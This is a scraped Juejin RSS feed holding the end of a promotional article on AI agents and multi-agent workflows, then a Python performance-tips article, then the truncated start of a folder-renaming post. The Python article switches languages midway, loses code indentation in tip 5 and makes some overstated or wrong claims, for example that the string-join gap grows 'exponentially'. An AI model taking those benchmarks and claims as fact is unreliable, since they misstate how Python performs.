<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08f421803e6843c58a1451646e150854~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=nz05kVTb%2FDJ4ZvFNw2U2Vk2G9oQ%3D" alt="" loading="lazy"/></p>
<ol start="3">
<li>
<p>行动与工具调用： 接下来，Agent 会调用其工具库，如搜索引擎、编程环境、数据库 API、邮件系统等，并执行具体的行动指令。这是 Agent 真正介入并改变外部世界的唯一途径。</p>
</li>
<li>
<p>记忆与经验沉淀： 所有的行动结果和中间状态都会被存储在记忆模块中。特别是长期记忆，它记录了 Agent 以往的成功经验和失败教训，为未来的决策提供宝贵的参考，使其行为具备连贯性与深度。</p>
</li>
<li>
<p>反思与优化迭代： 最关键的一环是反思。Agent 会根据行动结果和目标差距进行审视和评估，识别计划中的不足和错误，并自动修正下一次循环的策略。</p>
</li>
</ol>
<p>正是通过这个永不停止的闭环，Agent 才得以突破传统程序的局限，展现出真正的动态智能和自我迭代能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/684fbdd7d1a24cc489a2dd1b9c393cee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=9hTZ5yYe%2FnoNZH8hzVugztr5x48%3D" alt="" loading="lazy"/></p>
<p>我们已经明白 Agent 的原理，现在是时候洞察其商业和职场价值了。我们的判断标准很简单：凡是过去需要多步骤、多工具、多轮迭代的任务，现在都可以交给 Agent 完成。</p>
<ol>
<li>典型应用场景矩阵</li>
</ol>
<p>Agent 的应用价值在于其强大的跨领域整合能力。它不再是单一的工具，而是能够适应各种专业场景的通用执行者。</p>



































<table><thead><tr><th><strong>场景</strong></th><th><strong>Agent</strong> <strong>能干的事</strong></th><th><strong>价值洞察</strong></th></tr></thead><tbody><tr><td>📊<strong>市场研究</strong></td><td><strong>全自动调研：</strong>  自动爬取竞品数据、进行语义分析、生成关键市场趋势的量化报告。</td><td>将以往需要专业团队数日的工作，压缩到数小时。</td></tr><tr><td>💬<strong>营销推广</strong></td><td><strong>内容工厂：</strong>  自动策划活动主题、针对不同平台生成多版本文案、设计素材并进行 A/B 测试。</td><td>极大地提升营销素材的生产效率和测试迭代速度。</td></tr><tr><td>📈<strong>数据分析</strong></td><td><strong>自驱洞察：</strong>  自动连接数据库（SQL查询）、根据数据变化做图表、生成数据解读和业务优化建议。</td><td>让业务人员拥有顶尖数据科学家的一体化分析能力。</td></tr><tr><td>🧠<strong>办公助理</strong></td><td><strong>流程管理：</strong>  自动整理会议纪要、识别待办事项、分解任务、并跨平台（邮件、飞书等）跟进团队进度。</td><td>成为你的“多线程执行助理”，彻底解放你的精力。</td></tr><tr><td>🤖<strong>多 Agent 协作</strong></td><td><strong>虚拟公司：</strong>  多个 Agent 扮演不同角色（如 CEO、程序员、测试员），共同完成一个复杂的软件开发项目。</td><td>实现了一人公司模式下的高效率、低成本运营。</td></tr></tbody></table>
<ol start="2">
<li>深度案例： Agent团队的协作模式</li>
</ol>
<p>Agent 最具颠覆性的价值在于多 Agent 协作。这不再是单个 AI 帮人做事，而是多个 AI 之间像人类团队一样分工和沟通。</p>
<p>例如，一家小型创业公司想启动一个新产品的推广活动。传统上需要市场经理、文案、设计师和数据分析师。现在，你可以配置一个 Agent 团队：</p>
<p>CEO Agent（指挥官）： 接收目标，制定高层策略，并进行任务分配和资源协调。</p>
<p>市场 Agent（研究员）： 自动搜索并分析目标人群的社交媒体行为和痛点，生成《用户画像与痛点报告》。</p>
<p>内容 Agent（创作者）： 基于报告，自动生成针对性的软文、短视频脚本和 10 种不同风格的落地页文案。</p>
<p>数据 Agent（分析师）： 实时监控投放平台的表现数据，并向 CEO Agent 提交优化建议，指导下一轮的调整。</p>
<p>这种模式下，Agent 团队实现了高度自动化、专业化和实时协作，将人力资源从执行中彻底解放出来，专注于目标设定和最终创意把关。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/11d6b12b73ff436e8c85a28600ec68b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=kTWwmkW4%2BjTIdAGv58yIpN2XMi4%3D" alt="" loading="lazy"/></p>
<p>Agent 的出现，不仅仅是技术上的一个新功能，它标志着 AI 正在完成一次从工具到生产系统的底层范式革命。</p>
<p>LLM 带来了 AI 的智慧，而 Agent 则激活了 AI 的生产力。</p>
<ol>
<li>AI 进化的三大底层趋势</li>
</ol>





























<table><thead><tr><th><strong>进化方向</strong></th><th><strong>LLM</strong> <strong>时代</strong></th><th><strong>Agent</strong> <strong>时代</strong></th><th><strong>意义</strong></th></tr></thead><tbody><tr><td><strong>驱动模式</strong></td><td><strong>Prompt</strong> <strong>驱动</strong>（依赖人类精确指令）</td><td><strong>目标驱动</strong>（Goal-driven，自主规划）</td><td>AI 的角色从<strong>被动应答</strong>转变为<strong>主动解决问题</strong>。</td></tr><tr><td><strong>组织形式</strong></td><td><strong>单 Agent</strong>（孤立的 AI）</td><td><strong>多 Agent 协作</strong>（Multi-Agent）</td><td>解决了超复杂任务的自动化分解和执行问题。</td></tr><tr><td><strong>能力边界</strong></td><td><strong>短期上下文</strong></td><td><strong>长期记忆 + 人格化</strong></td><td>AI 能够积累经验、形成稳定“人格”，成为真正的长期伙伴。</td></tr></tbody></table>
<p>这种转变中最具颠覆性的，无疑是从Prompt 驱动向目标驱动的进化。在过去，我们需要绞尽脑汁去编写复杂的 Prompt 来告诉 AI 怎么做。</p>
<p>现在，我们只需要设定一个宏大的业务目标，Agent 会自主决策、规划路径，甚至在失败中学习并修正，这才是真正意义上的智能。</p>
<h2 data-id="heading-0">2. 巨头战略布局：争夺 Agent 操作系统</h2>
<p>全球科技巨头已经将 Agent 视为下一代计算平台的入口。</p>
<p>OpenAI 的 GPTs 已经证明了配置化 Agent 的潜力；而未来的 o1 Agents 则致力于打造一个更具通用执行能力的超级个体。</p>
<p>Google 正在深度整合 Gemini** 的多模态能力，以实现 Agent 在跨应用、跨设备场景下的无缝执行。</p>
<p>Anthropic 等厂商也在积极推进 Agent 的长期记忆和项目管理能力。</p>
<p>长远趋势：Agent 将演变为AI 操作系统</p>
<p>我们正在走向一个 AI OS 的时代。未来，你不再需要频繁打开各种 App 或软件，你只需要向你的 AI OS 下达一个高阶目标：帮我将这个季度财报做成一份给董事会的精简演示文稿。</p>
<p>AI OS 会自动调度底层的各种专业 Agent（数据分析 Agent、视觉设计 Agent、报告生成 Agent）协同工作，最终交付一份完美的结果。这彻底颠覆了人机交互和软件运行的逻辑。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f8ed67093794fc7a1d9f00c6a5e28a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765943769&amp;x-signature=rPF7TRf8Q5I8EEP5igwk6J124B8%3D" alt="" loading="lazy"/></p>
<p>Agent 的意义，最终要回归到个体价值的重塑。它将彻底改变我们的角色定位：我们不再是任务的执行者，而是 AI 团队的管理者和战略的制定者。 每个人都将拥有一个或一组高度专业化、具备长期记忆的 Agent。</p>
<p>这种人机共生将带来以下场景：</p>
<p>你的办公 Agent 将是你最可靠的“多线程助理”，负责在你不在场时自动跟进所有任务，协调不同部门间的沟通，确保项目按时交付。</p>
<p>你的营销 Agent 不仅会为你生成文案，更能自主监测全网热点，预测用户偏好，并及时调整投放策略，甚至为你节省上百万的试错成本。</p>
<p>你的专业 Agent 将自动为你筛选行业最新资讯，整理成精炼的报告，确保你时刻站在行业的最前沿。</p>
<p>核心理念：人机共生，实现价值倍增。</p>
<p>Agent 的出现不是为了取代人，而是为了解放人类的创造力、情感力和战略思维。它将处理那些重复、耗时、但又必须完成的工作，让你能够将精力投入到最能创造价值的活动上：设定正确的目标、建立深刻的关系、提出颠覆性的创意。</p>
<p>最终的洞察是：掌握 Agent，就是掌握未来 AI 生产力的入口。</p>
<p>在这个新时代，效率将不再是线性的提升，而是指数级的跃迁。谁能率先驯服并管理好自己的 Agent 虚拟团队，谁就能成为时代的引领者。</p>
<p>Agent 不仅仅是一个技术名词，它标志着 AI 已经完成了从能说到能做的终极进化。</p>
<p>这场革命让 AI 真正走出对话框，开始以目标为驱动，自主地去执行、去协作、去改变我们对工作、商业和创造力的所有认知。</p>
<p>理解 Agent 的结构、掌握 Agent 的原理，正是你获取下一代 AI 生产力的关键。</p>
<h3 data-id="heading-1">学习资源推荐</h3>
<p>如果你想更深入地学习大模型，以下是一些非常有价值的学习资源，这些资源将帮助你从不同角度学习大模型，提升你的实践能力。</p>
<blockquote>
<p>本文较长，建议点赞收藏。更多AI大模型应用开发学习视频及资料，在<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.com%2FEnjoyEDU%2FLLM" target="_blank" title="https://gitcode.com/EnjoyEDU/LLM" ref="nofollow noopener noreferrer">这里</a>。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python性能调优：5个90%开发者不知道的隐藏技巧，让你的代码速度提升3倍！]]></title>    <link>https://juejin.cn/post/7581870491763310644</link>    <guid>https://juejin.cn/post/7581870491763310644</guid>    <pubDate>2025-12-10T04:16:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491763310644" data-draft-id="7581844141668286504" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python性能调优：5个90%开发者不知道的隐藏技巧，让你的代码速度提升3倍！"/> <meta itemprop="keywords" content="后端,前端,人工智能"/> <meta itemprop="datePublished" content="2025-12-10T04:16:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿橙的百宝箱"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python性能调优：5个90%开发者不知道的隐藏技巧，让你的代码速度提升3倍！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿橙的百宝箱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T04:16:48.000Z" title="Wed Dec 10 2025 04:16:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>Python性能调优：5个90%开发者不知道的隐藏技巧，让你的代码速度提升3倍！</strong></h2>
<h3 data-id="heading-1">引言</h3>
<p>Python因其简洁、易读和强大的生态系统而广受欢迎，但在性能方面却常常被人诟病。尽管现代Python解释器（如CPython、PyPy）已经做了大量优化，但不当的编码习惯仍可能导致性能瓶颈。许多开发者依赖常见的优化手段（如使用内置函数、避免全局变量），但实际上还有一些鲜为人知的技巧可以显著提升代码速度。</p>
<p>本文将揭示5个90%的Python开发者可能不知道的性能调优技巧，这些技巧基于Python底层实现原理和编译器优化策略。通过实际案例和基准测试，你会看到如何轻松让代码运行速度提升3倍甚至更多。</p>
<hr/>
<h3 data-id="heading-2">1. 利用<code>__slots__</code>减少内存开销</h3>
<h4 data-id="heading-3">问题背景</h4>
<p>Python的动态特性允许在运行时为对象添加属性，但这种灵活性带来了内存开销。默认情况下，每个对象都有一个<code>__dict__</code>属性用于存储动态属性，这会消耗额外内存并降低访问速度。</p>
<h4 data-id="heading-4">解决方案</h4>
<p>通过定义<code>__slots__</code>类变量，可以显式声明对象的属性列表，从而禁用<code>__dict__</code>并节省内存：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RegularUser</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SlotUser</span>:
    __slots__ = [<span class="hljs-string">'name'</span>, <span class="hljs-string">'age'</span>]
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age
</code></pre>
<h4 data-id="heading-5">性能对比</h4>
<ul>
<li><strong>内存占用</strong>：使用<code>__slots__</code>后，对象内存占用减少40%~50%（实测100万个对象从约200MB降至120MB）。</li>
<li><strong>访问速度</strong>：属性访问速度快20%~30%，因为避免了字典查找的开销。</li>
</ul>
<h4 data-id="heading-6">适用场景</h4>
<p>适合需要创建大量实例且属性固定的类（如ORM模型、数据传输对象）。</p>
<hr/>
<h3 data-id="heading-7">2. 局部变量比全局变量快得多</h3>
<h4 data-id="heading-8">问题背景</h4>
<p>全局变量的访问需要通过全局命名空间字典（<code>globals()</code>），而局部变量则直接存储在函数的快速访问槽（fast locals）中。这种差异在循环或高频调用中会被放大。</p>
<h4 data-id="heading-9">解决方案</h4>
<p>将频繁访问的全局变量转为局部变量：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 慢速版</span>
global_var = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>)]
<span class="hljs-keyword">def</span> <span class="hljs-title function_">slow_func</span>():
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        <span class="hljs-built_in">sum</span>(global_var)

<span class="hljs-comment"># 快速版</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fast_func</span>():
    local_var = global_var  <span class="hljs-comment"># 转为局部变量</span>
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):
        <span class="hljs-built_in">sum</span>(local_var)
</code></pre>
<h4 data-id="heading-10">性能对比</h4>
<p>实测显示，在10万次循环中，局部变量版本比全局变量快1.5~2倍。</p>
<hr/>
<h3 data-id="heading-11">3. 字符串拼接：用<code>.join()</code>代替<code>+=</code></h3>
<h4 data-id="heading-12">问题背景</h4>
<p>字符串在Python中是不可变对象。使用<code>+=</code>操作会反复创建新对象并复制内容，导致O(n²)时间复杂度。而<code>.join()</code>会预先计算总长度并一次性分配内存。</p>
<h4 data-id="heading-13">解决方案</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 慢速版（时间复杂度高）</span>
result = <span class="hljs-string">""</span>
<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> string_list:
    result += s

<span class="hljs-comment"># 快速版（线性时间复杂度）</span>
result = <span class="hljs-string">""</span>.join(string_list)
</code></pre>
<h4 data-id="heading-14">性能对比</h4>
<p>对于包含1万个字符串的列表，<code>.join()</code>比循环拼接快50~100倍！这一差距随数据量增大而指数级扩大。</p>
<hr/>
<h3 data-id="heading-15">4. <code>lru_cache</code>装饰器缓存函数结果</h3>
<h4 data-id="heading-16">问题背景</h4>
<p>许多计算密集型函数会被相同参数重复调用（如递归、动态规划）。每次重新计算会浪费大量时间。</p>
<h4 data-id="heading-17">Python内置方案</h4>
<p>使用<code>functools.lru_cache</code>自动缓存结果：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> lru_cache

<span class="hljs-meta">@lru_cache(<span class="hljs-params">maxsize=<span class="hljs-literal">None</span></span>)  </span><span class="hljs-comment"># 无限制缓存</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fibonacci</span>(<span class="hljs-params">n</span>):
    <span class="hljs-keyword">if</span> n &lt; <span class="hljs-number">2</span>:
        <span class="hljs-keyword">return</span> n
    <span class="hljs-keyword">return</span> fibonacci(n-<span class="hljs-number">1</span>) + fibonacci(n-<span class="hljs-number">2</span>)
</code></pre>
<h4 data-id="heading-18">Benchmarks Results (Fibonacci Sequence Calculation Time Comparison):</h4>

















<table><thead><tr><th>Approach</th><th>Time Taken (for n=35)</th></tr></thead><tbody><tr><td>Naive Recursion</td><td>~6 seconds</td></tr><tr><td>With lru_cache</td><td>~0.00001 seconds</td></tr></tbody></table>
<p>The improvement is dramatic—up to <strong>600,000x faster</strong>! This technique shines when dealing with functions that have expensive computations and are called repeatedly with the same inputs.</p>
<hr/>
<h3 data-id="heading-19">Advanced Technique #5: Leveraging Built-in Functions Over Custom Loops</h3>
<p>Many Python developers write manual loops for tasks that could be handled more efficiently by built-in functions implemented in C.</p>
<p>Consider summing numbers from a list:</p>
<p>Bad Practice Example (Slow Loop Implementation):</p>
<p>numbers_list=[1]*10_000_000</p>
<p>total_sum=0
for num in numbers_list:
total_sum += num</p>
<p>Good Practice Example (Using Built-in Sum Function):</p>
<p>total_sum=sum(numbers_list)</p>
<p>Performance Impact Analysis via Timeit Module Testing Results Show That Using The Sum Function Is Approximately <strong>Twice As Fast</strong>.</p>
<p>Other examples where built-ins outperform custom logic include:</p>
<p>• max()/min() instead of manual comparisons • map()/filter() versus list comprehensions • all()/any() rather than boolean flags</p>
<p>The key takeaway here is to always check whether there's already an optimized built-in solution before writing your own implementation.</p>
<hr/>
<h2 data-id="heading-20">Conclusion</h2>
<p>Mastering these five hidden optimization techniques can dramatically improve your Python code's performance without sacrificing readability or maintainability:</p>
<p>1️⃣ Employing slots saves memory and speeds attribute access
2️⃣ Converting globals to locals reduces lookup overhead
3️⃣ Joining strings properly avoids quadratic behavior
4️⃣ Caching results prevents redundant computations
5️⃣ Leveraging built-ins taps into C-level optimizations</p>
<p>While premature optimization is famously discouraged ("the root of all evil" according to Donald Knuth), understanding these patterns allows you to make informed decisions when performance truly matters.The best optimizations often come from knowing how Python works under the hood—not from brute-force approaches like rewriting everything in Cython.</p>
<p>Remember:The fastest code is the code that doesn't need to run at all.Optimize algorithms first,then apply these tactical improvements where they'll have maximum impact.With careful application,the cumulative effect can easily yield <strong>3x speed improvements or better</strong> across critical sections of your application."</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[工作笔记-文件夹批量改名]]></title>    <link>https://juejin.cn/post/7581807793133600814</link>    <guid>https://juejin.cn/post/7581807793133600814</guid>    <pubDate>2025-12-10T04:45:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581807793133600814" data-draft-id="7581888578508275739" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="工作笔记-文件夹批量改名"/> <meta itemprop="keywords" content="操作系统,设计"/> <meta itemprop="datePublished" content="2025-12-10T04:45:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JohnYan"/> <meta itemprop="url" content="https://juejin.cn/user/3872909003334776"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            工作笔记-文件夹批量改名
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3872909003334776/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JohnYan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T04:45:08.000Z" title="Wed Dec 10 2025 04:45:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body 